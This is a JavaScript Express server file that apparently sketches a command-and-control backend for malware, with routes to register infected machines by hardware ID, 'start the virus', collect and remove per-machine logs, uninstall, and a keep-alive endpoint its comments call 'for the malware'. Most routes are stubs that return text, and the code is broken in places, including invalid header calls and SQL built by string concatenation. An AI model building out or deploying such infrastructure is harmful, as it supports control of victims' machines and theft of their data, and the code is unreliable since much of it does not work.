const express = require('express');
const app = express();
const port = 80;

const sqlite3 = require('sqlite3').verbose();

let db = new sqlite3.Database('Database.db', (err) => {
  if (err) {
    console.error(err.message);
  }
  console.log('Connected to the chinook database.');
});

let connectedCount = 0;

// untested more coming soon!

// Customer Routes
//const hashCode = s =>
//    s.split('').reduce((a, b) => {
//      a = (a << 5) - a + b.charCodeAt(0);
//      return a & a;
//    }, 0);
//    
//    
//function submitMe() {
//  var pass = document.getElementById('userPwd').value;
//  var enc = hashCode(pass);
//  document.getElementById('userPwd').value = enc;
//  console.log(enc);   //for debug
//  console.log(document.getElementById('userPwd').value);   // for debug
//}

app.post('/Login', (req, res) => {
  req.headers.get("Hardware-id"); // Each machine has a unique Hardware id 
                                  // Using That im seeing how many computers have used this
                                  // then we flag the admin/owner and they'll decide their Fait.

  req.body.user.userencrypted // Encrypted with this servers public pgp key 
  req.body.user.passencrypted //
                              // Fully encrypted with PGP and Hashed usernames and passwords 
                              // Fully ceperates the server from their customers info

  res.send('Login successful');
});

//NOTE: The hardware identification process (HWID) does not ever collect or transmit any data that can be used to identify an individual or company.
// https://geologismiki.gr/Documents/How%20does%20registration%20work.pdf  - xd go learn

app.post('/Register', (req, res) => {
  req.headers.get('Hardware-id');
  req.body.user.usernamehash
  req.body.user.passwordhash
  res.send("Register succesful")
})
app.get('/launch', (req, res) => {
    headers = req.headers;
    headers.get('Auth-key');
    res.send('display customers');
});

// Machines Routes

app.get('/Machines', (req, res) => {
    headers = req.headers;
    headers.get('Auth-key');
    res.send('display machines');
});

app.post("/machines/new", (req,res) => {
    headers = req.headers;
    headers.get('app-id');
    res.send("Adds hwid to database and starts the virus")
});

app.post("/machines/Remove", (req,res) => {
    res.send("uninstall from machine")
});

// Logs Routes

app.get('/logs', (req, res) => {
  res.send('These are our logs');
});

app.get("/Logs/new", (req, res) => {
    res.send("Adding log to hwid in db 1")
})

app.get("/Logs/Remove", (req, res) => {
    res.send("Removing log from hwid in db 1")
});

// keep alive stuff for the malware and machine counter in sqlite3 database

var lastnumber = 0;
app.use((req, res, next) => {
  connectedCount++;
  lastnumber = connectedCount;
  if (lastnumber !== connectedCount) {
    console.log(`New connection! Total connected machines: ${connectedCount}`);
  }  
  let sql = `SELECT Pulse FROM Settings`;
  db.each(sql, [], (err, rows) => {
      if (err) {
          throw err;
      }
      Pulsedb(rows.Pulse + 1);
      return z = rows.Pulse + 1
  });
  next();
});

app.use((req, res, next) => {
  setTimeout(function () {
    connectionclose();
  }, 10000);
  next();
});

function Pulsedb(id){
  var sql2 = "UPDATE Settings SET Pulse = " + id;
  db.each(sql2, [], (err, rows) => {
      if (err) {
          throw err;
      }
      console.log(rows);
  });
}
function set_to_zero(){
  var sql2 = "UPDATE Settings SET Pulse = 0";
  db.each(sql2, [], (err, rows) => {
      if (err) {
          throw err;
      }
      console.log(rows);
  });
}
var loop = 0;
function connectionclose(){
  connectedCount--;
  set_to_zero();
  loop++;
  if (loop == 1000){
    console.log(`Connection closed! Total connected machines: ${connectedCount}`);
    loop = 0;
  }
}
app.get('/keep-alive', (req, res) => {
  res.sendStatus(200); //just a route for machines to let us know theyre connected ;)
});

app.listen(port, () => {
  console.log(`Server listening on port ${port}`);
});